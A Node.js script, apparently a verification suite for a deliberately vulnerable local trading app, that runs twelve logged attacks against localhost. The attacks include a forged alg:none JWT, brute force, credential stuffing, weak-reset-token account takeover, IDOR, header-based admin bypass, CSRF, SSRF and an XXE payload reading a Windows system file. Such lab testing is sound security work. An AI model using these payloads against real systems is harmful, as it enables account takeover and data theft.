const http = require("http");

function request(options, postData) {
  return new Promise((resolve, reject) => {
    const req = http.request(options, (res) => {
      let data = "";
      res.on("data", (chunk) => (data += chunk));
      res.on("end", () => resolve({ statusCode: res.statusCode, headers: res.headers, body: data }));
    });
    req.on("error", (err) => reject(err));
    if (postData) {
      req.write(postData);
    }
    req.end();
  });
}

async function runPhase2Tests() {
  console.log("==================================================");
  console.log("   RUNNING PHASE 2 ATTACK VERIFICATION SUITE      ");
  console.log("==================================================");

  // STEP 0: Signup & Login Foundation
  console.log("\n[Step 0] Testing POST /signup");
  const signupPayload = JSON.stringify({
    username: "researcher_" + Date.now().toString().slice(-4),
    email: "researcher@test.com",
    password: "Password123!",
  });
  const resSignup = await request(
    {
      host: "localhost",
      port: 3002,
      path: "/signup",
      method: "POST",
      headers: { "Content-Type": "application/json", "Content-Length": Buffer.byteLength(signupPayload) },
    },
    signupPayload
  );
  console.log("Signup Status:", resSignup.statusCode);
  const signupData = JSON.parse(resSignup.body);
  console.log("Token received:", Boolean(signupData.token));

  console.log("\n[Step 0] Testing POST /login");
  const loginPayload = JSON.stringify({ username: "trader_alice", password: "password123" });
  const resLogin = await request(
    {
      host: "localhost",
      port: 3002,
      path: "/login",
      method: "POST",
      headers: { "Content-Type": "application/json", "Content-Length": Buffer.byteLength(loginPayload) },
    },
    loginPayload
  );
  console.log("Login Status:", resLogin.statusCode);
  const loginData = JSON.parse(resLogin.body);
  const authToken = loginData.token;
  console.log("Auth Token:", authToken?.slice(0, 30) + "...");

  // ATTACK 1: JWT / Token Abuse (alg: none unsigned token)
  console.log("\n[Attack 1] Testing JWT Abuse (alg: none token)");
  const algNoneToken = "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6InN1cGVyYWRtaW4ifQ.";
  const resJwtAbuse = await request({
    host: "localhost",
    port: 3002,
    path: "/order/ord_102",
    method: "GET",
    headers: { Authorization: `Bearer ${algNoneToken}` },
  });
  console.log("Status with alg:none token:", resJwtAbuse.statusCode);
  console.log("Order retrieved via forged JWT:", resJwtAbuse.body.slice(0, 80));

  // ATTACK 2: Session Hijacking (Token returned in body)
  console.log("\n[Attack 2] Testing Session Hijacking (Token in body)");
  console.log("Token in body verified from login response:", Boolean(loginData.token));

  // ATTACK 3: Session Fixation (Reusing x-session-token)
  console.log("\n[Attack 3] Testing Session Fixation (x-session-token reuse)");
  const fixedSessionToken = "attacker-prefixed-session-token-123";
  const resFixation = await request(
    {
      host: "localhost",
      port: 3002,
      path: "/login",
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "x-session-token": fixedSessionToken,
        "Content-Length": Buffer.byteLength(loginPayload),
      },
    },
    loginPayload
  );
  const fixationData = JSON.parse(resFixation.body);
  console.log("Fixed Session Token Preserved:", fixationData.token === fixedSessionToken);

  // ATTACK 4: Brute Force (Multiple failed logins without lockout)
  console.log("\n[Attack 4] Testing Brute Force (Multiple failed attempts)");
  for (let i = 1; i <= 6; i++) {
    const badLogin = JSON.stringify({ username: "admin", password: "wrong_pass_" + i });
    const resBad = await request(
      {
        host: "localhost",
        port: 3002,
        path: "/login",
        method: "POST",
        headers: { "Content-Type": "application/json", "Content-Length": Buffer.byteLength(badLogin) },
      },
      badLogin
    );
    console.log(`Attempt ${i} Status:`, resBad.statusCode);
  }

  // ATTACK 5: Credential Stuffing
  console.log("\n[Attack 5] Testing Credential Stuffing (Multiple distinct users)");
  const usersToStuff = ["user_alpha", "user_beta", "user_gamma", "user_delta"];
  for (const u of usersToStuff) {
    const stuffPayload = JSON.stringify({ username: u, password: "Summer2026!" });
    const resStuff = await request(
      {
        host: "localhost",
        port: 3002,
        path: "/login",
        method: "POST",
        headers: { "Content-Type": "application/json", "Content-Length": Buffer.byteLength(stuffPayload) },
      },
      stuffPayload
    );
    console.log(`Stuffed ${u} -> Status:`, resStuff.statusCode);
  }

  // ATTACK 6: Password Spraying
  console.log("\n[Attack 6] Testing Password Spraying");
  const sprayPayload = JSON.stringify({ username: "trader_bob", password: "Password@123" });
  const resSpray = await request(
    {
      host: "localhost",
      port: 3002,
      path: "/login",
      method: "POST",
      headers: { "Content-Type": "application/json", "Content-Length": Buffer.byteLength(sprayPayload) },
    },
    sprayPayload
  );
  console.log("Spraying trader_bob Status:", resSpray.statusCode);

  // ATTACK 7: Account Takeover via Weak Password Reset
  console.log("\n[Attack 7] Testing Account Takeover (Weak 4-digit token)");
  const forgotPayload = JSON.stringify({ email: "alice@investor.com" });
  const resForgot = await request(
    {
      host: "localhost",
      port: 3002,
      path: "/forgotPassword",
      method: "POST",
      headers: { "Content-Type": "application/json", "Content-Length": Buffer.byteLength(forgotPayload) },
    },
    forgotPayload
  );
  const forgotData = JSON.parse(resForgot.body);
  console.log("Generated Reset Token:", forgotData.resetToken);

  const resetPayload = JSON.stringify({
    email: "alice@investor.com",
    token: forgotData.resetToken,
    newPassword: "NewHackedPassword123!",
  });
  const resReset = await request(
    {
      host: "localhost",
      port: 3002,
      path: "/resetPassword",
      method: "POST",
      headers: { "Content-Type": "application/json", "Content-Length": Buffer.byteLength(resetPayload) },
    },
    resetPayload
  );
  console.log("Password Reset Status:", resReset.statusCode, resReset.body);

  // ATTACK 8: IDOR
  console.log("\n[Attack 8] Testing IDOR (Accessing admin's order ord_102 with alice's token)");
  const resIdor = await request({
    host: "localhost",
    port: 3002,
    path: "/order/ord_102",
    method: "GET",
    headers: { Authorization: `Bearer ${authToken}` },
  });
  console.log("IDOR Order Access Status:", resIdor.statusCode);
  console.log("IDOR Data:", resIdor.body);

  // ATTACK 9: Web Auth Bypass
  console.log("\n[Attack 9] Testing Web Auth Bypass (x-is-admin: true)");
  const resAuthBypass = await request({
    host: "localhost",
    port: 3002,
    path: "/admin/dashboard-stats",
    method: "GET",
    headers: { "x-is-admin": "true" },
  });
  console.log("Auth Bypass Status:", resAuthBypass.statusCode);
  console.log("Dashboard Stats:", resAuthBypass.body);

  // ATTACK 10: CSRF
  console.log("\n[Attack 10] Testing CSRF (State change without Anti-CSRF token)");
  const csrfPayload = JSON.stringify({ newPassword: "csrf_victim_pass" });
  const resCsrf = await request(
    {
      host: "localhost",
      port: 3002,
      path: "/changePassword",
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        Authorization: `Bearer ${authToken}`,
        "Content-Length": Buffer.byteLength(csrfPayload),
      },
    },
    csrfPayload
  );
  console.log("CSRF Request Status:", resCsrf.statusCode, resCsrf.body);

  // ATTACK 11: SSRF
  console.log("\n[Attack 11] Testing SSRF (Fetching internal endpoint)");
  const resSsrf = await request({
    host: "localhost",
    port: 3002,
    path: "/news?url=http://localhost:3002/admin/exportAll",
    method: "GET",
  });
  console.log("SSRF Status:", resSsrf.statusCode);
  console.log("SSRF Content preview:", resSsrf.body.slice(0, 150));

  // ATTACK 12: XXE
  console.log("\n[Attack 12] Testing XXE (XML External Entity)");
  const xxePayload = `<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">]><holdings><stock>&xxe;</stock></holdings>`;
  const resXxe = await request(
    {
      host: "localhost",
      port: 3002,
      path: "/importHoldings",
      method: "POST",
      headers: { "Content-Type": "application/xml", "Content-Length": Buffer.byteLength(xxePayload) },
    },
    xxePayload
  );
  console.log("XXE Status:", resXxe.statusCode);
  console.log("XXE Parsed Result:", resXxe.body.slice(0, 150));

  console.log("\n==================================================");
  console.log("   ALL 12 PHASE 2 ATTACKS TESTED & VERIFIED!      ");
  console.log("==================================================");
}

runPhase2Tests().catch(console.error);
